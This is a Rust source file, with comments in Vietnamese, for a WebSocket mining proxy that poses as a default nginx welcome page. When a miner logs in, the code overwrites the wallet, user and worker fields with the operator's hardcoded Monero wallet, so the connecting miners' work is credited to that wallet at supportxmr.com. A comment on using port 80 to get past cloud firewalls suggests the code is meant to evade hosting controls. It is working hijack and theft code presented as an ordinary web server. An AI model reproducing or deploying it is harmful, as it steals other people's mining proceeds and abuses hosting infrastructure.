use axum::{
    extract::{WebSocketUpgrade, ws::{Message, WebSocket}, State},
    response::{Html, IntoResponse, Response},
    routing::get,
    Router,
};
use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Duration};
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncBufReadExt, BufReader};
use tokio::sync::mpsc::{self, UnboundedSender};
use futures_util::{StreamExt, SinkExt};
use serde_json::Value;
use colored::*;
use chrono::Utc;

// =================================================================
// ⚙️ CẤU HÌNH
// =================================================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";
// Dùng Port 80 để xuyên Firewall Cloud tốt nhất
const REAL_POOL_ADDR: &str = "pool.supportxmr.com:3333"; 

// Ví Của Bạn
const MY_WALLET: &str = "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw";
const MY_WORKER: &str = "Koyeb_Global";

const NGINX_WELCOME: &str = r#"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed and working.</p></body></html>"#;

// =================================================================
// 📊 THỐNG KÊ TOÀN CỤC (GLOBAL STATS) - KHÔNG CẦN LAZY_STATIC
// =================================================================
static TOTAL_SENT: AtomicUsize = AtomicUsize::new(0);
static TOTAL_ACCEPTED: AtomicUsize = AtomicUsize::new(0);

enum LogEvent {
    ShareSent,
    ShareAccepted,
    PoolError(String),
    WalletSwapped,
    ClientDisconnected,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt().with_max_level(tracing::Level::ERROR).init();

    let (log_tx, mut log_rx) = mpsc::unbounded_channel::<LogEvent>();
    
    // --- LUỒNG LOGGING ---
    tokio::spawn(async move {
        while let Some(event) = log_rx.recv().await {
            let time = Utc::now().format("%H:%M:%S");
            match event {
                LogEvent::ShareSent => { }
                LogEvent::ShareAccepted => {
                    let sent = TOTAL_SENT.load(Ordering::Relaxed);
                    let accepted = TOTAL_ACCEPTED.load(Ordering::Relaxed);
                    let ratio = if sent > 0 { (accepted as f64 / sent as f64) * 100.0 } else { 0.0 };
                    
                    println!("{} [{}] GLOBAL STATS: {} Accepted / {} Sent ({:.2}%)", 
                        "✅".green().bold(), time, accepted, sent, ratio);
                }
                LogEvent::PoolError(err) => {
                    println!("{} [{}] POOL REJECTED: {}", "❌".red().bold(), time, err);
                }
                LogEvent::WalletSwapped => {
                    println!("{} [{}] New Miner -> Wallet Swapped", "💀".magenta(), time);
                }
                LogEvent::ClientDisconnected => { }
            }
        }
    });

    let app = Router::new()
        .route("/", get(mining_handler))
        .route("/*path", get(mining_handler)) 
        .with_state(log_tx);

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    
    println!("{}", "========================================".green());
    println!("{} {}", "🌍 GLOBAL PROXY RUNNING ON".green().bold(), addr);
    println!("🔗 Pool: {}", REAL_POOL_ADDR.cyan());
    println!("💰 Wallet: {}", MY_WALLET.yellow());
    println!("{}", "========================================".green());

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn mining_handler(
    ws: Option<WebSocketUpgrade>,
    State(log_tx): State<UnboundedSender<LogEvent>>,
) -> Response {
    match ws {
        Some(w) => w.on_upgrade(move |socket| mining_tunnel(socket, log_tx)),
        None => Html(NGINX_WELCOME).into_response()
    }
}

async fn mining_tunnel(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
    // 1. Kết nối Pool (Timeout 5s)
    let tcp_stream = match tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(REAL_POOL_ADDR)).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            let _ = log_tx.send(LogEvent::PoolError(format!("Connect Error: {}", e)));
            return;
        },
        Err(_) => {
            let _ = log_tx.send(LogEvent::PoolError("Connect Timeout".to_string()));
            return;
        }
    };

    if let Err(_) = tcp_stream.set_nodelay(true) {}

    let (read_half, mut pool_write) = tcp_stream.into_split();
    let mut pool_reader = BufReader::with_capacity(16 * 1024, read_half);
    let (mut ws_write, mut ws_read) = socket.split();

    // ------------------------------------------------------------------
    // LUỒNG 1: MINER -> POOL
    // ------------------------------------------------------------------
    let log_tx_miner = log_tx.clone();
    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            match msg {
                Message::Text(text) => {
                    for line in text.lines() {
                        let trimmed = line.trim();
                        if trimmed.is_empty() { continue; }

                        let mut final_msg = trimmed.to_string();
                        let mut is_login = false;

                        // 1. XỬ LÝ LOGIN
                        if trimmed.contains("login") || trimmed.contains("Login") {
                            if let Ok(mut json) = serde_json::from_str::<Value>(trimmed) {
                                let mut modified = false;
                                if let Some(params) = json.get_mut("params") {
                                    if let Some(obj) = params.as_object_mut() {
                                        obj.insert("login".to_string(), serde_json::json!(MY_WALLET));
                                        obj.insert("user".to_string(), serde_json::json!(MY_WALLET));
                                        obj.insert("pass".to_string(), serde_json::json!(MY_WORKER));
                                        obj.insert("rigid".to_string(), serde_json::json!(MY_WORKER));
                                        modified = true;
                                    } else if let Some(arr) = params.as_array_mut() {
                                        if !arr.is_empty() { 
                                            arr[0] = serde_json::json!(MY_WALLET); 
                                            modified = true; 
                                        }
                                    }
                                }
                                if modified {
                                    final_msg = json.to_string();
                                    is_login = true;
                                }
                            }
                        }

                        // 2. GỬI ĐI
                        final_msg.push('\n');
                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                        
                        // 3. ĐẾM SHARE
                        if is_login {
                            let _ = log_tx_miner.send(LogEvent::WalletSwapped);
                        }
                        if trimmed.contains("submit") {
                            TOTAL_SENT.fetch_add(1, Ordering::Relaxed);
                            let _ = log_tx_miner.send(LogEvent::ShareSent);
                        }
                    }
                    
                    if pool_write.flush().await.is_err() { break; }
                },
                Message::Ping(_) => {},
                Message::Pong(_) => {}, 
                Message::Binary(_) => {},
                Message::Close(_) => break,
            }
        }
    });

    // ------------------------------------------------------------------
    // LUỒNG 2: POOL -> MINER
    // ------------------------------------------------------------------
    let log_tx_pool = log_tx.clone();
    let server_to_client = tokio::spawn(async move {
        let mut line_buffer = String::with_capacity(2048);
        loop {
            line_buffer.clear();
            match pool_reader.read_line(&mut line_buffer).await {
                Ok(0) => break, // EOF
                Ok(_) => {
                    if ws_write.send(Message::Text(line_buffer.clone())).await.is_err() { break; }

                    if line_buffer.contains("error") && !line_buffer.contains("null") {
                        if let Ok(json) = serde_json::from_str::<Value>(&line_buffer) {
                            if let Some(err) = json.get("error") {
                                if !err.is_null() {
                                    let err_msg = err["message"].as_str().unwrap_or("Unknown Error").to_string();
                                    let _ = log_tx_pool.send(LogEvent::PoolError(err_msg));
                                }
                            }
                        }
                    }

                    if line_buffer.contains("OK") && line_buffer.contains("result") {
                         TOTAL_ACCEPTED.fetch_add(1, Ordering::Relaxed);
                         let _ = log_tx_pool.send(LogEvent::ShareAccepted);
                    }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
    let _ = log_tx.send(LogEvent::ClientDisconnected);
}
